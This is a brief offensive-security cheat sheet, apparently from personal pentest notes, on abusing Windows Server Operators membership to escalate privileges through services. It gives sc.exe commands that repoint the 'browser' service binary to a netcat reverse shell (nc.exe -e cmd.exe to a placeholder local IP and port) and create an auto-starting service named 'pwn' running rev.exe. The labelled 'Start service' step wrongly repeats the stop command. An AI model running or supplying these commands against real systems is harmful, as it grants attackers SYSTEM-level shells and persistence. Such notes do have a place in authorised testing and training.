---
title: "Server Operators"
date: 2024-7-13
tags: ["server operators", "active driectory", "ad", "Windows", "privesc", "service"]
---

### Abuse #1: Change service path

<div>

```console
# Change a service path (e.g. browser)
sc.exe config browser binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>"
```

```console
# Stop service
sc.exe stop browser
```

```console
# Start service
sc.exe stop browser
```

</div>

### Additional: Create service

<div>

```console
# Create a service
sc.exe create pwn binpath= C:\ProgramData\rev.exe start= auto
```

</div>

<br>